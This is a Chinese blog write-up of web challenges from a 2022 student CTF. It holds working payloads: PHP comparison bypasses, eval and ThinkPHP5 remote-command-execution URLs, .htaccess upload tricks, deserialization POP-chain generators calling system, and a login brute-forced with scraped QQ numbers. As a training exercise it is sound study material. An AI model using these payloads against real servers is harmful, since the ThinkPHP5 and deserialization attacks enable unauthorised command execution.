---
title: "2022 SWPU NSS 新生赛 Web Writeup"
date: 2022-10-03T16:20:52+08:00
lastmod: 2022-10-03T16:20:52+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

<!--more-->

## funny_web

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031824887.png)

用户名是实验室名 (NSS), 密码是招新群某位的 qq

招新群一直找不到, 于是去 qun.qq.com 导出了下 nss 群里所有人的 qq, 用 intruder 爆破了一会, 结果是 2122693401

登录之后是个 intval 的绕过

```php
<?php
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
highlight_file(__FILE__);
include('flag.php');
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if ($num != '12345') {
        if (intval($num) == '12345') {
            echo $FLAG;
        }
    } else {
        echo "这为何相等又不相等";
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031827657.png)

## 奇妙的MD5

response header

```
hint: select * from 'admin' where password=md5($pass,true)
```

填入 `ffifdyop`, 然后右键查看源码

```html
<!--
$x= $GET['x'];
$y = $_GET['y'];
if($x != $y && md5($x) == md5($y)){
    ;
-->
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031829626.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031830836.png)

## where_am_i

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031831420.png)

社工题

Google 和百度识图搜一下发现是 `成都山水间古迹酒店`, 然后搜一下电话号码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031834315.png)

把 `-` 去掉, 输入 `02886112888` 即可得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031835759.png)

## ez_ez_php

```php
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 3) === "php" ) {
        echo "Nice!!!";
        include($_GET["file"]);
    } 

    else {
        echo "Hacker!!";
    }
}else {
    highlight_file(__FILE__);
}
//flag.php
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210031840503.png)

## webdog1__start

右键注释

```html
<!--
if (isset($_GET['web']))
{
    $first=$_GET['web'];
    if ($first==md5($first)) 
     
-->
```

找到一个加密前后都是 0e 的字符串就行了

```
md5(0e215962017) = 0e291242476940776845150308577824
```

之后跳转到 start.php, response header 中有 `hint: why not go to f14g.php first`

最后再根据 hint 跳转到 F1l1l1l1l1lag.php

```php

<?php
error_reporting(0);
highlight_file(__FILE__);

if (isset($_GET['get'])){
    $get=$_GET['get'];
    if(!strstr($get," ")){
        $get = str_ireplace("flag", " ", $get);
        if (strlen($get)>18){
            die("This is too long.");
            }
            else{
                eval($get);
          } 
    }else {
        die("nonono"); 
    }
} 
?>
```

```
http://1.14.71.254:28275/F1l1l1l1l1lag.php?get=system($_GET[1]);&1=cat /flag
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032054842.png)

## Ez_upload

.htaccess

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032059850.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032059105.png)

flag 在环境变量里

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032100687.png)

## numgame

/js/1.js

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032101022.png)

解码后是 NsScTf.php

```php
<?php
error_reporting(0);
//hint: 与get相似的另一种请求协议是什么呢
include("flag.php");
class nss{
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m",$_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}
```

访问 hint2.php 显示 `有没有一种可能，类是nss2`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032103358.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032103349.png)

不太理解这题是干什么的

## ez_ez_php(revenge)

```php
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 3) === "php" ) {
        echo "Nice!!!";
        include($_GET["file"]);
    } 

    else {
        echo "Hacker!!";
    }
}else {
    highlight_file(__FILE__);
}
//flag.php
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032106724.png)

## ez_rce

查看 robots.txt 发现 /NSS/index.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032107363.png)

thinkphp5

参考文章 [https://y4er.com/posts/thinkphp5-rce/](https://y4er.com/posts/thinkphp5-rce/)

随便找一个 payload

```
http://1.14.71.254:28133/NSS/index.php?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=cat /nss/ctf/flag/flag
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210032109282.png)

## ez_sql

报错注入, 过滤了空格和 and, 分别用注释和双写绕过

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210040917578.png)

## ez_1zpop

```php
<?php
error_reporting(0);
class dxg
{
   function fmm()
   {
      return "nonono";
   }
}

class lt
{
   public $impo='hi';
   public $md51='weclome';
   public $md52='to NSS';
   function __construct()
   {
      $this->impo = new dxg;
   }
   function __wakeup()
   {
      $this->impo = new dxg;
      return $this->impo->fmm();
   }

   function __toString()
   {
      if (isset($this->impo) && md5($this->md51) == md5($this->md52) && $this->md51 != $this->md52)
         return $this->impo->fmm();
   }
   function __destruct()
   {
      echo $this;
   }
}

class fin
{
   public $a;
   public $url = 'https://www.ctfer.vip';
   public $title;
   function fmm()
   {
      $b = $this->a;
      $b($this->title);
   }
}

if (isset($_GET['NSS'])) {
   $Data = unserialize($_GET['NSS']);
} else {
   highlight_file(__file__);
}
```

简单 pop 链构造以及 wakeup 的绕过

```php
<?php

class lt
{
   public $impo;
   public $md51;
   public $md52;

}

class fin
{
   public $a = 'assert';
   public $title = 'system($_GET[1])';

}


$b = new fin();

$a = new lt();
$a->impo = $b;
$a->md51 = 's878926199a';
$a->md52 = 's155964671a';

echo serialize($a);
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210040923561.png)

## 1z_unserialize

```php
<?php
 
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;

        $a($this->lly);
     }
    
    
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
 
 
?> 
```

简单反序列化

```php
<?php

class lyh{
    public $lt = 'assert';
    public $lly = 'system($_GET[1]);';
}

echo serialize(new lyh());
?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210041230712.png)

## xff

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210041231766.png)

## js_sign

右键查看 main.js

```js
document.getElementsByTagName("button")[0].addEventListener("click", ()=>{
    flag="33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15"
    if (btoa(flag.value) == 'dGFwY29kZQ==') {
        alert("you got hint!!!");
    } else {
        alert("fuck off !!");
    }    
})
```

base64 解密后是 tapcode

记得把空格去掉, 不然解出来的明文会有缺失

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210041232783.png)